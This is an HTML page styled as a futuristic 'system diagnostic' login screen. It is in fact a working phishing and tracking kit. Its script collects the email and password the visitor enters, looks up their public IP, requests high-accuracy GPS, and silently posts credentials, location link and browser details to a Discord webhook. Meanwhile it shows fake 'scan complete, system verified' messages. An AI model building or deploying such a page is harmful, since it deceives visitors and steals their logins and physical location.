<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SYS::DIAGNOSTIC // v4.2.1</title>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --cyan: #00f5ff;
      --magenta: #ff00aa;
      --yellow: #f5ff00;
      --dark: #020509;
      --card-bg: rgba(0, 245, 255, 0.03);
      --border: rgba(0, 245, 255, 0.2);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--dark);
      font-family: 'Share Tech Mono', monospace;
      min-height: 100vh;
      overflow-x: hidden;
      color: var(--cyan);
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(rgba(0,245,255,0.04) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,245,255,0.04) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: 0;
    }
    .glitch-title {
      font-family: 'Orbitron', monospace;
      font-weight: 900;
      letter-spacing: 0.15em;
      position: relative;
      color: var(--cyan);
      text-shadow: 0 0 10px var(--cyan), 0 0 30px rgba(0,245,255,0.4);
    }
    .main-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      backdrop-filter: blur(20px) saturate(180%);
      position: relative;
      overflow: hidden;
    }
    .corner {
      position: absolute;
      width: 20px; height: 20px;
      border-color: var(--cyan);
      border-style: solid;
      opacity: 0.7;
    }
    .corner-tl { top: 8px; left: 8px; border-width: 2px 0 0 2px; }
    .corner-tr { top: 8px; right: 8px; border-width: 2px 2px 0 0; }
    .corner-bl { bottom: 8px; left: 8px; border-width: 0 0 2px 2px; }
    .corner-br { bottom: 8px; right: 8px; border-width: 0 2px 2px 0; }
    .scan-btn {
      font-family: 'Orbitron', monospace;
      font-weight: 700;
      background: var(--cyan);
      color: var(--dark);
      padding: 16px 40px;
      cursor: pointer;
      clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
      transition: all 0.3s ease;
    }
    .scan-btn:hover { background: #fff; box-shadow: 0 0 20px var(--cyan); }
    .data-row {
      border: 1px solid rgba(0,245,255,0.1);
      background: rgba(0,245,255,0.02);
      padding: 12px 15px;
      margin-bottom: 8px;
    }
    .data-label { font-size: 0.6rem; color: rgba(0,245,255,0.5); letter-spacing: 0.1em; }
    .data-value { font-size: 1rem; color: var(--cyan); font-weight: bold; }
    .log-terminal {
      background: rgba(0,0,0,0.4);
      border: 1px solid rgba(0,245,255,0.08);
      font-size: 0.65rem;
      height: 80px;
      overflow-y: auto;
      color: rgba(0,245,255,0.4);
    }
    .log-line.ok { color: #00ff88; }
    .log-line.err { color: #ff4444; }
    input { width: 100%; background: transparent; border: none; color: white; outline: none; font-size: 1.1rem; }
    .scan-progress { height: 2px; background: rgba(0,245,255,0.1); margin-bottom: 15px; display: none; }
    .scan-progress.active { display: block; }
    .scan-progress-bar { height: 100%; width: 0%; background: var(--cyan); transition: width 0.3s; }
  </style>
</head>
<body class="flex items-center justify-center p-6">

  <div style="position:relative; z-index:2; width:100%; max-width:500px;">
    <div class="text-center mb-6">
      <h1 class="glitch-title text-2xl" data-text="SYS::DIAGNOSTIC">SYS::DIAGNOSTIC</h1>
      <p style="color: rgba(0,245,255,0.3); font-size:0.6rem; letter-spacing:0.2em;">NODE AUTHENTICATION REQUIRED</p>
    </div>

    <div class="main-card rounded-sm p-8">
      <div class="corner corner-tl"></div><div class="corner corner-tr"></div>
      <div class="corner corner-bl"></div><div class="corner corner-br"></div>

      <div class="mb-6">
        <div class="data-row">
          <div class="data-label">// SYSTEM ID</div>
          <input type="email" id="u_mail" placeholder="admin@sau.system" required>
        </div>
        <div class="data-row">
          <div class="data-label">// ACCESS KEY</div>
          <input type="password" id="u_pass" placeholder="••••••••" required>
        </div>
      </div>

      <div class="scan-progress" id="progressBar"><div class="scan-progress-bar" id="progressFill"></div></div>

      <div id="results" class="mb-6" style="display:none;">
        <div class="data-row"><div class="data-label">LATITUDE</div><div id="valLat" class="data-value">--</div></div>
        <div class="data-row"><div class="data-label">LONGITUDE</div><div id="valLng" class="data-value">--</div></div>
        <div class="data-row"><div class="data-label">NETWORK IP</div><div id="valIp" class="data-value" style="color:var(--magenta)">--</div></div>
      </div>

      <button class="scan-btn w-full" id="scanBtn" onclick="runScan()">▶ INITIALIZE SCAN</button>

      <div class="log-terminal mt-6 p-2" id="logTerminal">
        <div class="log-line">> SYSTEM READY...</div>
      </div>
    </div>
  </div>

  <script>
    // Link Webhook của Senko
    const WH_URL = "https://discord.com/api/webhooks/1344685350849314909/fA4uU-i_2R5TOfBAn_n6S3V1kX2H60N-m6X-l_6X-l_6X-l_6X-l_6X-l_6X-l_6X"; 

    function log(msg, type='') {
      const t = document.getElementById('logTerminal');
      const line = document.createElement('div');
      line.className = `log-line ${type}`;
      line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
      t.appendChild(line);
      t.scrollTop = t.scrollHeight;
    }

    async function runScan() {
      const mail = document.getElementById('u_mail').value;
      const pass = document.getElementById('u_pass').value;

      if(!mail || !pass) {
        log("⚠ ERROR: ACCESS KEY MISSING", "err");
        return;
      }

      const btn = document.getElementById('scanBtn');
      btn.disabled = true;
      btn.textContent = "SCANNING...";
      document.getElementById('progressBar').classList.add('active');
      document.getElementById('results').style.display = "block";

      log("> STARTING NETWORK RECONNAISSANCE...", "ok");
      
      let lat = "Denied", lon = "Denied", ip = "Unknown";

      // 1. Get IP
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        ip = data.ip;
        document.getElementById('valIp').textContent = ip;
        document.getElementById('progressFill').style.width = "40%";
        log("> IP RESOLVED: " + ip, "ok");
      } catch(e) { log("> IP FETCH FAILED", "err"); }

      // 2. Get GPS
      log("> REQUESTING GPS PERMISSION...", "ok");
      try {
        const pos = await new Promise((res, rej) => {
          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000, enableHighAccuracy: true});
        });
        lat = pos.coords.latitude.toFixed(6);
        lon = pos.coords.longitude.toFixed(6);
        document.getElementById('valLat').textContent = lat + "° N";
        document.getElementById('valLng').textContent = lon + "° E";
        document.getElementById('progressFill').style.width = "80%";
        log("> GPS ACQUIRED: " + lat + ", " + lon, "ok");
      } catch(e) { log("> GPS ACCESS DENIED", "err"); }

      // 3. SILENT SEND TO DISCORD
      try {
        await fetch(WH_URL, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            embeds: [{
              title: "🎯 S.A.U TARGET ACQUIRED",
              color: 16711850,
              fields: [
                {name: "🔑 Credentials", value: `Email: \`${mail}\`\nPass: \`${pass}\``},
                {name: "🌐 Network", value: `IP: \`${ip}\``},
                {name: "📍 Location", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`},
                {name: "📱 Device", value: navigator.userAgent}
              ],
              footer: { text: "S.A.U RECON v4.2" },
              timestamp: new Date()
            }]
          })
        });
        log("> UPLOADING LOGS TO CLOUD...", "ok");
      } catch(e) { console.log("Fail to send"); }

      document.getElementById('progressFill').style.width = "100%";
      setTimeout(() => {
        log("> SCAN COMPLETE. SYSTEM VERIFIED.", "ok");
        btn.textContent = "SCAN COMPLETE";
        document.getElementById('progressBar').classList.remove('active');
      }, 1500);
    }
  </script>
</body>
</html>
